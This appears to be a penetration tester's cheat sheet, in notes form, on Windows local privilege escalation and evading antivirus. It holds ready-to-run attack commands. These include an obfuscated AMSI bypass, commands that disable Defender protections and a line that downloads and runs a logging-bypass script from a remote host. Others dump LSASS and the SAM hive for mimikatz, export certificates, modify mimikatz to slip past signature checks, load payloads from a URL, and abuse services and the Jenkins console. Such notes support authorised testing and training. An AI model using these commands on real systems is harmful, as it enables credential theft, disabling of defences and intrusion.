# Local Privilege Escalation / AV Bypass

## Ways for local privesc

* Missing patches
* Automated deployment (e.g. C:\Windows\panther\unattend.xml, C:\Windows\Panther, C:\Windows\Panther\UnattendGC, C:\Windows\System32\sysprep\Panther, s ) and AutoLogon passwords in clear text in Windowds Registry
* AlwaysInstallElevated (Any user can run MSI as SYSTEM)
* Misonfigured Services (e.g. Unquoted Service path, Permissions with Services/Directories
* DLL Hijacking                 &#x20;
* Tools: \
  PowerUp - . .\PowerUp.ps1 Invoke-AllCheck\
  BeRoot - .\beRoot.exe\
  Privesc - . .\PrivEsc.ps1 Invoke-PrivEsc\
  Seatbelt - .\seatbelt.exe all&#x20;

## Service Issues using PowerUp

**Do all checks**

```powershell
. .\PowerUp.ps1
Invoke-AllChecks
```

The Parameter "StartName" is the privilege e.g. LocalSystem\
The Parameter "CanRestart" is useful so we can restart it on our own and dont have to restart machine/wait until the service is restarted

**Get services with unquoted paths an a space in their name**

```powershell
GetServiceUnquoted -Verbose
Get-WmiObject -Class win32_service | select pathname
```

**Get services where the current user can write to its binary path or change arguments to the binary**

```powershell
Get-ModifiableServiceFile -Verbose 
=> Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dom\username'
=> Add your domain user to local admin group!

```

**Add user to local Administrator Group**

```powershell
net localgroup Administrators john /add
```

**Check if you are local admin**

```powershell
net session

If you are NOT an admin, you get an access is denied message.
System error 5 has occurred.
Access is denied.

If you ARE an admin, you get a different message, the most common being:
There are no entries in the list
```

**Get the services whose configuration current user can modify (e.g ACLs of the Service, maybe point service to different executable**

```powershell
Get-ModifiableService -Verbose 
```

## Find all writeable directories

**Find writeable folders (not recursive) for a user on a specific path**\
&#x20;.\accesschk.exe -d -w yourusername C:\Windows\system32\*

**Find writeable folders recursively for a user on a specific path**\
&#x20;.\accesschk.exe -s -d -w yourusername C:\\\*

## Abusing Enterprise Applications

* If Windows based, the often run as SYSTEM or Local Administrator
* Often overlooked by the Security team
* CI/CD Tools are interesting for abuse because they often need local high privilege - e.g Jenkins
* Jenkins
  * Anonymous read rights are/were default and you could see the build executor like Windows Server....
  * No Bruteforce Protection / No lockout / No PW policy for Jenkins local accounts (Check UserID)
  * When we have admin to Jenkins Server: http://url/script => Get you to the script console, Goovy scripts can be executed
    * That code will run on the build master (not the slaves)
    * ![](<.gitbook/assets/image (6).png>)
  * Try Username:Username, Usern:ReverseOfUsername etc.
  * Try to "Configure"a  Project and add build step "Execute Windows Batch Command and enter "powershell -c \<command>&#x20;
    * http://url/job/\[ProjectName]/configure => 200 Code if we have the permissions=> Check with Burp for all Projects
    * Check all Projects with all Users
    * Put your build step as the first one, so it wil get executed no matter the errors of other steps
    *   E.g

        <figure><img src=".gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

## **Bypass AV / Defender / Applocker / Enhanced Script Block Logging**

**AMSI Bypass**\
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( TYpE ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )

amsi.fail

**Disable AV Protection/Monitoring**

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue
</strong><strong>Set-MpPreference -DisableScriptScanning 1 -ErrorAction SilentlyContinue
</strong>Set-MpPreference -DisableIOAVProtection 1 -ErrorAction SilentlyContinue 
Set-MpPreference -DisableBehaviorMonitoring 1 -ErrorAction SilentlyContinue 
Set-MpPreference -DisableIntrusionPreventionSystem 1 -ErrorAction SilentlyContinue 

Set-MpPreference -DisableRemovableDriveScanning 1 -ErrorAction SilentlyContinue 
Set-MpPreference -DisableBlockAtFirstSeen 1 -ErrorAction SilentlyContinue 
Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan 1 -ErrorAction SilentlyContinue 
Set-MpPreference -DisableArchiveScanning 1 -ErrorAction SilentlyContinue 
Set-MpPreference -DisableScanningNetworkFiles 1 -ErrorAction SilentlyContinue 
</code></pre>

Kill defender:\
[https://bidouillesecurity.com/disable-windows-defender-in-powershell/](https://bidouillesecurity.com/disable-windows-defender-in-powershell/)\
[https://github.com/jeremybeaume/tools/blob/master/disable-defender.ps1](https://github.com/jeremybeaume/tools/blob/master/disable-defender.ps1)

**Check Powershell Language Mode**

{% code overflow="wrap" %}
```powershell
$ExecutionContext.SessionState.LanguageMode
```
{% endcode %}

**Check Excludes for Defender (need Admin Privs on some Hosts?)**

{% code overflow="wrap" %}
```powershell
Get-MpPreference | Select-Object -Property ExclusionPath -ExpandProperty ExclusionPath
Get-ChildItem -Path 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\'

gpresult /h gp.html  => search in there?
```
{% endcode %}

\
**AppLocker Policy**

{% code overflow="wrap" %}
```powershell
Get-AppLockerPolicy -Effective 
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\....
```
{% endcode %}

**Bypasses Enhanced Script Block Logging**

<pre class="language-powershell"><code class="lang-powershell">iex (iwr http://172.16.100.x/sbloggingbypass.txt -UseBasicParsing)

or paste the content of sbloggingbypass.txt
<strong>
</strong></code></pre>

**Bypass Device Guard**

* If possible deactivate Defender first - dmp will be otherwise deleted
* Find Device Guard configuration

{% code overflow="wrap" %}
```powershell
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
```
{% endcode %}

* Dump Lsass with comsvcs.dll

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>Disable defender: “Set-MpPreference -DisableRealtimeMonitoring $true”
</strong><strong>tasklist /FI "IMAGENAME eq lsass.exe"
</strong>rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump [PIDHere] C:\Users\Public\lsass.dmp full
Copy file to localhost: echo F | xcopy \\us-jump\C$\Users\Public\lsass.dmp C:\AD\Tools\lsass.dmp
Start local mimikatz
sekurlsa::minidump C:\AD\Tools\lsass.DMP
privilege::debug
sekurlsa::ekeys
</code></pre>

* Use reg.exe

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>Dump registry hives
</strong>reg save HKLM\SECURITY c:\test\security.bak &#x26;&#x26; reg save HKLM\SYSTEM c:\test\system.bak &#x26;&#x26; reg save HKLM\SAM c:\test\sam.bak
Dump the hashes with samdump2 on kali

<strong>
</strong></code></pre>

* Check for certificates

{% code overflow="wrap" %}
```powershell
echo F | xcopy C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat \\usjump\C$\Users\Public\RunWithRegistryNonAdmin.bat /Y
echo F | xcopy C:\AD\Tools\InviShell\InShellProf.dll \\us-jump\C$\Users\Public\InShellProf.dll /y

ls cert:\LocalMachine\My
Try to export the certificate: ls
ls cert:\LocalMachine\My\89C1171F6810A6725A47DB8D572537D736D4FF17 | Export-PfxCertificate -FilePath C:\Users\Public\pawadmin.pfx -Password (ConvertTo-SecureString -String 'YourPassword123' -Force -AsPlainText)
```
{% endcode %}

Use in AD CS Attacks, see Lab 17



* Dump lsass with taskmanager if we have rdp accesss
* Use other Lolbins // msbuild, rundll32, regsvc

**Identify Code/Strings Defender may flag**\
https://github.com/matterpreter/DefenderCheck => C# without builds\
[https://gist.github.com/daddycocoaman/108d807e89a0f9731304bc848fa219f0](https://gist.github.com/daddycocoaman/108d807e89a0f9731304bc848fa219f0) => python [https://github.com/rasta-mouse/ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) => also c# without builds

DefenderCheck.exe path-to-sharpkatz.exe\
Visutal studio, CTRL + H, Replace all "Credentials" with "whatever", Scope as "Entire Solution", Replace All, Build and recheck

OutCompressedDll.ps1 for SafetyKatz\
[https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-CompressedDll.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-CompressedDll.ps1)\
Out-compressedDll mimikatz.exe > output.txt\
Copy $EncodedCompressedFile from output.txt and replace compressedMimikatzString in constants.cs of safetykatz\
Copy the byte size from the output file an replace it in program.cs on line 111 & 116\
Build and recheck

BetterSafetyKatz\
Use mimikatz\_trunk.zip and convert to base64\
Modify program.cs - add new variable with base64, comment the download code, convert base64 to bytes and pass it to zipStream

rubeus.exe - ConfuserEx [https://github.com/mkaring/ConfuserEx](https://github.com/mkaring/ConfuserEx)\


## Payload Delivery

NetLoader https://github.com/Flangvik/NetLoader - Used to load binary from filepath or URL an patch AMSI & ETW wihile executing

Loader.exe -path http://ip/safetykatz.exe

Assemblyload can be used to load NetLoader in-memory from a URL and then loads binary from filepath\
assemblyload.exe [https://github.com/KINGSABRI/AssemblyLoader](https://github.com/KINGSABRI/AssemblyLoader) ????\
assemblyload.exe http://ip/loader.exe -path http://ip/safetykatz.exe



## PrivEsc Scripts

{% embed url="https://github.com/enjoiz/Privesc" %}

. .\privesc.ps1\
Invoke-PrivEsc

{% embed url="https://github.com/AlessandroZ/BeRoot./beRoot.exe" %}

./beroot.exe

{% embed url="https://github.com/HarmJ0y/PowerUp" %}

```powershell
. ./powerup
Invoke-allchecks
Get-ServiceUnquoted -Verbose
Get-ModifiableServiceFile -Verbose
Invoke-ServiceAbuse
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName '<domain>\<username>'
```

{% embed url="https://github.com/S1ckB0y1337/WinPwn" %}

## WMI



{% embed url="https://github.com/secabstraction/WmiSploit" %}

```
Enter-WmiShell -ComputerName desktop-1st179m -UserName netbiosX
Invoke-WmiCommand -ComputerName desktop-1st179m -ScriptBlock {tasklist}
```

{% embed url="https://github.com/FortyNorthSecurity/WMImplant" %}

```
Import-Module .\WMImplant.ps1
Invoke-WMImplant
```

**`WMI Commands`**

{% code overflow="wrap" %}
```powershell
wmic process call create "calc.exe"
wmic process where name="calc.exe" call terminate
wmic environment list
Turn on Remoted Desktop Remotely: wmic /node:"servername" /user:"user@domain" /password: "password" RDToggle where ServerName="server name" call SetAllowTSConnections 1

wmic useraccount list
wmic group list

wmic share list


wmic qfe list
```
{% endcode %}
